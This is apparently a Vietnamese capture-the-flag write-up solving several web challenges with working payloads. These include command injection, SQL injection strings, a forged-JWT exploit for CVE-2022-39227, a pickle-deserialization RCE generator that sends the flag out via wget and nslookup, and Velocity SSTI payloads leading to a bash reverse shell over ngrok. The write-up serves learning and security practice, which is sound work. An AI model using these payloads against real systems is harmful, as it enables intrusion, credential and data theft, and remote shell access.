# Flag Command

## Appilcation Overview
Trang home page khi mình visit nó sẽ như sau
![image](https://hackmd.io/_uploads/SkVCsQt0p.png)

Thử bắt các request đến server với Burp Suite. Source code của app này có 3 file chính `game.js`, `main.js`, `command.js` cùng với đó là nó sẽ call api với các endpoint `options` và `monitor`.
![image](https://hackmd.io/_uploads/S1NW3mKRT.png)

Ở đây mình thấy response của endpoint options chứa các command hợp lệ của các step khác nhau, nhưng ở đây chứa 1 command kì lạ với key là `secret`: `"Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"`

Nhập command này vào endpoint monitor, mình sẽ có được flag.
![image](https://hackmd.io/_uploads/ry3ypQKR6.png)

# Time KORP

## Application Overview 
![image](https://hackmd.io/_uploads/rJy-JNYR6.png)

Đây là 1 challenge command injection đơn giản, khi app đưa thẳng input của user với parameter là `format` vào hàm `exec` mà không có validate gì cả.
![image](https://hackmd.io/_uploads/S1k307YRT.png)

Việc ở đây là chỉ cần escape dấu single quote đúng cách và làm sao không làm hỏng câu command gốc của app là được. Ở đây mình sẽ thử với chính máy của mình sau đó mới đưa payload lên app sau.

Với payload `format=';ls '.` mình đã thành công command injection. 
![image](https://hackmd.io/_uploads/HJkYy4t0p.png)

Đọc DockerFile mình thấy flag được đặt ở `/flag`
![image](https://hackmd.io/_uploads/BymCyVYC6.png)

Payload: `format=';cat '/flag`
![image](https://hackmd.io/_uploads/SyVlgEKAp.png)

# KORP Terminal 
`username=' or if(substring(database(),1,1)='K', benchmark(3000000,MD5(1)), 1) = 1 -- -&password=test`

`username=admin'+AND+EXTRACTVLUE(1337,CONCAT('.','~',(SELECT+schema_name+FROM+INFORMATION_SCHEMA.SCHEMA),'~'))+--+-&password=test`
Với payload này thì lỗi trả về là Subquery returns mỏe than 1 row. Thay vào đó sử dụng group_concat vào chỗ schema_name thì nó sẽ nối các kết quả lại thành 1 string.
`username=admin'+AND+EXTRACTVLUE(1337,CONCAT('.','~',(SELECT+group_concat(schema_name)+FROM+INFORMATION_SCHEMA.SCHEMA),'~'))+--+-&password=test`

Sử dụng thêm substring vì có thể kết quả trả về nó bị giới hạn kí tự
`username=admin'+AND+EXTRACTVLUE(1337,CONCAT('.','~',(SELECT+substring(group_concat(schema_name),1,32)+FROM+INFORMATION_SCHEMA.SCHEMA),'~'))+--+-&password=test`

Sau đó lấy các bảng trong schema này. Do bài này có đến 3 schema trong database nên phải trỏ đến đúng schema
`username=admin'+AND+EXTRACTVLUE(1337,CONCAT('.','~',(SELECT+group_concat(table_name)+FROM+INFORMATION_SCHEMA.tables+WHERE+table_schema='korp_terminal')))+--+-&password=test`

Lấy cột
`username=admin'+AND+EXTRACTVLUE(1337,CONCAT('.','~',(SELECT+group_concat(column_name)+FROM+INFORMATION_SCHEMA.columns+WHERE+table_schema='korp_terminal'+AND+table_name='users')))+--+-&password=test`

Lấy password
`username=admin'+AND+EXTRACTVLUE(1337,CONCAT('.','~',(SELECT+group_concat(username)+FROM+users)))+--+-&password=test`

`username=admin'+AND+EXTRACTVLUE(1337,CONCAT('.','~',(SELECT+group_concat(password)+FROM+users)))+--+-&password=test`

Unintended Solution
`username=abcdxyz'+UNION+SELECT+'$2a$11$0Uq00jmBw5DDgBpInb6Dqem9o5lrZGMDLHBpb5ujtyTYRMVTJuRBK'+--+-&password=test`

Chuỗi kia là mã hóa dạng Bcrypt rounds 12 của từ 'password'
Câu lệnh query database có thể như sau
`SELECT password FROM users WHERE username='username'`
Rồi sau đó password được lấy ra từ database sẽ được so sánh với password người dùng nhập vào. Cho nên là thử SQLi ở input password sẽ không có chuyện gì xảy ra. 

# Local Talk
Challenge này chứa 2 lỗ hổng đó là [CVE-2023-45539](https://nvd.nist.gov/vuln/detail/CVE-2023-45539) và [CVE-2022-39227](https://nvd.nist.gov/vuln/detail/CVE-2022-39227). Bằng cách bypass `HAproxy ACL` dẫn đến việc truy cập được endpoint cung cấp cho ta đoạn `jwt` sử dụng `python_jwt` module version 3.3.3, từ đó ta có thể thay đổi role của user thành admin và lấy được flag.

> HAproxy là viết tắt của High Availability Proxy, là 1 phần mềm mã nguồn mở được sử dụng rộng rãi để cân bằng tải và phân phối proxy cho các ứng dụng web và TCP.
> 
> ACL trong HAproxy là viết tắt của Access Control List, là danh sách các quy tắc được sử dụng để kiểm soát truy cập vào các tài nguyên. Trong HAproxy, ACL có thể được sử dụng để cho phép hoặc từ chối các truy cập dựa trên địa chỉ IP, hạn chế truy cập vào các URL hoặc đường dẫn cụ thể, chuyển hướng lưu lượng truy cập đến các máy chủ khác nhau và xác thực người dùng. 

Challenge sẽ có UI như sau
![H1s1leGAa](https://hackmd.io/_uploads/ryxJC4Fk0.png)

Chúng ta có 3 API bao gồm `/api/v1/get_ticket`, `/api/v1/chat/{chatId}` và `/api/v1/flag`

1. `/api/v1/get_ticket`
```python=
@api_blueprint.route('/get_ticket', methods=['GET'])
 def get_ticket():

     claims = {
         "role": "guest", 
         "user": "guest_user"
     }

     token = jwt.generate_jwt(claims, current_app.config.get('JWT_SECRET_KEY'), 'PS256', datetime.timedelta(minutes=60))
     return jsonify({'ticket: ': token})
```

Endpoint này có thể tạo ra 1 đoạn token sử dụng PS256 (một thuật toán chữ ký điện tử dựa trên chuỗi (Elliptic Curve Digital Signature Algorithm - ECDSA)) được sử dụng trong JWS (JSON Web Signature). Ở đây, role của chúng ta được set mặc định là `guest`.

2. `/api/v1/get_ticket`

```python=
@api_blueprint.route('/flag', methods=['GET'])
@authorize_roles(['administrator'])
def flag():
    return jsonify({'message': current_app.config.get('FLAG')}), 200
```

Để lấy được flag thì ta cần phải có role là admin. Như vậy mục tiêu là cần thay đổi role của user thành administrator. Tuy nhiên, vấn đề là khi truy cập vào endpoint `/api/v1/get_ticket` thì trả về status code là 403

![By4CZxfRT](https://hackmd.io/_uploads/B1CwkStJC.png)

Do ACL của HAproxy đã chặn. 
```
frontend haproxy
    bind 0.0.0.0:1337
    default_backend backend

    http-request deny if { path_beg,url_dec -i /api/v1/get_ticket }
```

Ở đoạn config này ta thấy HAproxy cấu hình lắng nghe port 1337, chuyển hướng yêu cầu không khớp đến backend. ACL kiểm tra đường dẫn của request và từ chối các request bắt đầu bằng `/api/v1/get_ticket`

Chúng ta có thể bypass nó bằng cách
**Get access ticket by bypassing HAProxy ACL with # fragment**
[CVE-2023-45539](https://nvd.nist.gov/vuln/detail/CVE-2023-45539)

Cụ thể là HAproxy trước phiên bản 2.8.2 chấp nhận ký tự `#` trong URI, điều này có thể cho phép attacker thu thập thông tin nhạy cảm hoặc có tác động không xác định khi phân tích sai `path_end`, ví dụ như định tuyến `index.html#.png` đến 1 máy chủ tĩnh.

![SkH89xzCT](https://hackmd.io/_uploads/SkEjerF1C.png)

**Forging a new JWT Token with tampered claims in order to bypass role restrictions**

Sau khi thành công lấy được token, việc tiếp theo cần làm là thay đoạn token sao cho role của user thành `administrator`

Challenge này sử dụng `pyjwt 3.3.3`, tồn tại 1 lỗ hổng `CVE-2022-39227`. 
```python=
#test/vulnerability_vows.py  
""" Test claim forgery vulnerability fix """  
from datetime import timedelta  
from json import loads, dumps  
from test.common import generated_keys  
from test import python_jwt as jwt  
from pyvows import Vows, expect  
from jwcrypto.common import base64url_decode, base64url_encode  

@Vows.batch  
class ForgedClaims(Vows.Context):  
   """ Check we get an error when payload is forged using mix of compact and JSON formats """  
   def topic(self):  
       """ Generate token """  
       payload = {'sub': 'alice'}  
       return jwt.generate_jwt(payload, generated_keys['PS256'], 'PS256', timedelta(minutes=60))  

   class PolyglotToken(Vows.Context):  
       """ Make a forged token """  
       def topic(self, topic):  
           """ Use mix of JSON and compact format to insert forged claims including long expiration """  
          [header, payload, signature] = topic.split('.')  
           parsed_payload = loads(base64url_decode(payload)) 
           parsed_payload['sub'] = 'bob'  
           parsed_payload['exp'] = 2000000000  
           fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))  
           return '{" ' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' +signature + '"}' 
       class Verify(Vows.Context):  
           """ Check the forged token fails to verify """  
           @Vows.capture_error  
           def topic(self, topic):  
               """ Verify the forged token """  
               return jwt.verify_jwt(topic, generated_keys['PS256'], ['PS256'])  
           def token_should_not_verify(self, r):  
               """ Check the token doesn't verify due to mixed format being detected """  
               expect(r).to_be_an_error()  
               expect(str(r)).to_equal('invalid JWT format')
```

Đây là exploit code. 
```python=
from datetime import timedelta
from json import loads, dumps
import python_jwt as jwt
from pyvows import Vows, expect
from jwcrypto.common import base64url_decode, base64url_encode
from pprint import pprint
class ForgedClaims:
    def create(self):
        """ Generate token """
        # payload = {'sub': 'alice'}
        token = "eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTAxNDc1MTksImlhdCI6MTcxMDE0MzkxOSwianRpIjoiYmQtcW5GYnBqcUhpbEFSeXN5aGwyUSIsIm5iZiI6MTcxMDE0MzkxOSwicm9sZSI6Imd1ZXN0IiwidXNlciI6Imd1ZXN0X3VzZXIifQ.s569WtLjeq3NQSI9GXVDfTYJSUrxdEGtCBnxjHnwEa6UWwS6RNfLF-qMjvAc-GiqHzG1Wx1SQd1tsqIqnIF6zz9zXFQaSimFgnYE0HvUwaI_XhzBJA-ZxmrgetgJjbOhKBOopKIXmtUt-LPE2tsB3yr6SJe-C2RvFlTzrgQMDrOtRBJJiXfYne1QI4nnXUFY0XsNXCpKQIe6ELHNmeE-F6Fj5s1AJwUEBwWJNVnmw_s5mVbL1hvIE54e2mJg5VK8PfCLXx4u-ghVRgGDRkUza4UpgM8nrSmTj5d40iREyz9M6PDvi0TFhuVvlQStrpz0UId-uyL4-Vwp9UnTOSNBRA"
        return token
    def topic(self, topic):
        """ Use mix of JSON and compact format to insert forged claims including long expiration """
        [header, payload, signature] = topic.split('.')
        parsed_payload = loads(base64url_decode(payload))
        print(parsed_payload)
        parsed_payload['role'] = 'administrator'
        parsed_payload['user'] = 'admin_user'
        print(parsed_payload)
        # parsed_payload['exp'] = 2000000000
        fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))
        return '{"  ' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"}'
claime__ = ForgedClaims()
jwt = claime__.create()
print(claime__.topic(jwt))
```

![BkPzY_G0a](https://hackmd.io/_uploads/rkgmQSKyR.png)

Đọc thêm phần giải thích CVE tại [đây](https://kcsc.edu.vn/htb-cyber-apocalypse-ctf-2024-hacker-royale-write-up).

# SerialFlow
**About vulnerebility**
- Memcache Remote Code Execution via SSRF by serialized data injection into Memcached
- Documentation: https://btlfry.gitlab.io/notes/posts/memcached-command-injections-at-pylibmc/

![overview](https://hackmd.io/_uploads/SkSuFrKkA.png)


Challenge này có 2 routes: `/` và `/set` cho phép ta custome lại color của website
![Untitled](https://hackmd.io/_uploads/BkdttrY10.png)

Và 2 handler để xử lí error và sessions trước mọi request. Ở đây, nếu session dài hơn 86 kí tự, thì nó sẽ bị cắt từ kí tự thứ 87 trở đi.
![Untitled](https://hackmd.io/_uploads/ByxpKrtJA.png)

2 routes này không có gì đáng nghi ngờ, nhưng server đang mở port 11211 cho memcached
![Untitled](https://hackmd.io/_uploads/r1_kqrY1A.png)

- Có 1 vuln serialized data injection vào Memcached thông qua việc tạo sesion, ta có thể inject nó vào memcached (python pickle) để sesrialize data ta truyền vào

Chi tiết đọc thêm tại [đây](https://btlfry.gitlab.io/notes/posts/memcached-command-injections-at-pylibmc/).
**References:**
- [SSRF, Memcached and other key-value injections in the wild](https://d0znpp.medium.com/ssrf-memcached-and-other-key-value-injections-in-the-wild-c8d223bd856f)
- [Exploiting Python pickles](https://davidhamann.de/2020/04/05/exploiting-python-pickle/)

Nói về `Flask-Session`, nó lưu session data dưới dạng pickle serialized objects và deserialize nó khi session được đọc

```python=
full_session_key = self.key_prefix + session.sid

if not PY2:
    val = self.serializer.dumps(dict(session), 0)
else:
    val = self.serializer.dumps(dict(session))
self.client.set(full_session_key, val, self._get_memcache_timeout(
                total_seconds(app.permanent_session_lifetime)))
```

Vì app này sử dụng memcached, nếu chúng ta có thể chèn 1 chuỗi `CRLF` vào trong payload, chúng ta có thể đạt được memcached injeciton, và chúng ta có thể inject 1 serialized payload tùy ý được lưu trữ trong 1 memcached key tùy ý có thể được deser gây ra RCE. 

> CRLF là nói đến Carriage Return (ASCII 133, `\r`) Line Feed (ASCII 10, `\n`). CHúng được sử dụng để note lại việc chấm dứt 1 dòng, được xử lý khác nhau trong các hệ điều hành phổ biến hiện này. Trong giao thức HTTP, chuỗi CR-LF luôn được sử dụng để kết thúc một dòng.
> CRLF injection attack xảy ra khi 1 user quản lý việc gửi CRLF vào 1 app. Điều này thường được thực hiện bằn cách sử đổi tham số HTTP hoặc URL.

Như trong blog post về memcache bên trên, tá giả có nói rằng, không thể đặt chuỗi CRLF bình thường trên các HTTP header(nói đến session cookie mà chúng ta cần inject) vì chúng được sanitized.

Tuy nhiên, vì RFC2109 được triển khai trong case này, chúng ta có thể bypass nó bằng cách encoding special char thành ký hiệu bát phân có tiền tố là blacklash `\`.

Để ý ở session handler thì ta có thể tùy chỉnh session theo ý mình, vì vậy mình có thể inject payload vào session, sau đó tạo thêm 1 request bất kì để đẩy payload inject vào memcached để serialize
![Untitled](https://hackmd.io/_uploads/HkLanV9kC.png)

Build local và bắt gói tin bằng wireshark, ta có có được set và get command
![Untitled](https://hackmd.io/_uploads/S1DeTNcJR.png)

Sửa lại exploit code trong PoC để tạo payload
```python=
import pickle
import os

class RCE:
    def __reduce__(self):
        cmd = ('wget http://y8gdi5i3.requestrepo.com/$(cat /f*)')
        return os.system, (cmd,)

def generate_exploit():
    payload = pickle.dumps(RCE(), 0)
    payload_size = len(payload)
    cookie = b'\r\nset session:f0965c70-401b-4b6f-932c-b251165c1d5d 0 2592000 '
    cookie += str.encode(str(payload_size))
    cookie += str.encode('\r\n')
    cookie += payload
    cookie += str.encode('\r\n')
    cookie += str.encode('get session:f0965c70-401b-4b6f-932c-b251165c1d5d')
    pack = ''
    for x in list(cookie):
        if x > 64:
            pack += oct(x).replace("0o","\\")
        elif x < 8:
            pack += oct(x).replace("0o","\\00")
        else:
            pack += oct(x).replace("0o","\\0")

    return f"\"{pack}\""
print(generate_exploit())
```

Ở đây mình cũng có thể sử dụng lệnh nslookup để gọi đến server mình đang host
`nslookup $(cat /flag*).myserver.com`

![Untitled](https://hackmd.io/_uploads/Syl5R6V9JC.png)

# Labyrinth Linguist
Đây là 1 challenge SSTI rõ ràng sử dụng Velocity template của Java nhưng mình lại không nhìn ra. Các payload đều có thể search trên internet áp vào case này được luôn

```java=
#set($s="")
#set($stringClass=$s.getClass())
#set($stringBuilderClass=$stringClass.forName("java.lang.StringBuilder"))
#set($inputStreamClass=$stringClass.forName("java.io.InputStream"))
#set($readerClass=$stringClass.forName("java.io.Reader"))
#set($inputStreamReaderClass=$stringClass.forName("java.io.InputStreamReader"))
#set($bufferedReaderClass=$stringClass.forName("java.io.BufferedReader"))
#set($collectorsClass=$stringClass.forName("java.util.stream.Collectors"))
#set($systemClass=$stringClass.forName("java.lang.System"))
#set($stringBuilderConstructor=$stringBuilderClass.getConstructor())
#set($inputStreamReaderConstructor=$inputStreamReaderClass.getConstructor($inputStreamClass))
#set($bufferedReaderConstructor=$bufferedReaderClass.getConstructor($readerClass))

#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
#set($process=$runtime.exec("ls /"))
#set($null=$process.waitFor() )

#set($inputStream=$process.getInputStream())
#set($inputStreamReader=$inputStreamReaderConstructor.newInstance($inputStream))
#set($bufferedReader=$bufferedReaderConstructor.newInstance($inputStreamReader))
#set($stringBuilder=$stringBuilderConstructor.newInstance())

#set($output=$bufferedReader.lines().collect($collectorsClass.joining($systemClass.lineSeparator())))

$output
```

Payload bên trên có thể output ra màn hình luôn

```java=
#set($s="")
#set($stringClass=$s.getClass())
#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
#set($process=$runtime.exec("payload"))
#set($null=$process.waitFor() )
```

Payload này thì mình sẽ cố gắng tạo ra 1 revershell với các bước như sau
1. Mở ngrok trên máy mình. Giả sử có địa chỉ là tcp://0.tcp.ngrok.io:14337 -> localhost 1234
2. Tạo 1 thư mục trên máy và trong đó có 1 file sh chứa payload tạo revershell như sau
```
#!/bin/bash
bash -i >& /dev/tcp/0.tcp.ngrok.io/14337 0>&1
```
3. Mở python server tại thư mục đó python -m http.server 1234
4. Sử dụng payload SSTI bên trên thay chữ "payload"
    - `curl -o /tmp/shell.sh http://0.tcp.ngrok.io:14337/shell.sh`
    - `chmod +x /tmp/shell.sh`
    - Sau đó phải mở netcat trên máy `nc -lvnp 1234`
    - `bash /tmp/shell.sh`

Đã thử trên máy local, bắt được shell nhưng không làm gì được (làm đúng quy trình mà)

Tiếp theo là 1 payload ngắn hơn payload đầu tiên và có thể output ra màn hình
```java=
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('ls /'))
$ex.waitFor()
#set($out=$ex.getInputStream())
#forEach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))
#end
```